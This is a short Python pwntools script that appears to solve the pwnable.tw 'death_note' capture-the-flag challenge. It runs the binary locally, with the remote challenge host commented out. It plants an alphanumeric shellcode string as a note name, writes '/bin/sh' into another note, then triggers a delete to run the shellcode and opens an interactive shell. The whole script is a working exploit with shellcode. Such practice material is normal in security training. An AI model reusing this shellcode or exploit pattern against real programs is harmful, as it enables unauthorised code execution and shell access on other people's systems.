from pwn import *

#r = remote("chall.pwnable.tw",10201)
r = process("./death_note")

r.sendlineafter("choice :","1")
gdb.attach(r)
r.sendlineafter("Index :","1")
r.sendlineafter("Name :","P[RSTYP\RXHf5eAf5W>P_jAX4JWWFFFF")
r.sendlineafter("choice :","1")
r.sendlineafter("Index :","0")
r.sendlineafter("Name :","/bin/sh")
r.sendlineafter("choice :","3")
r.sendlineafter("Index :","0")
r.interactive()
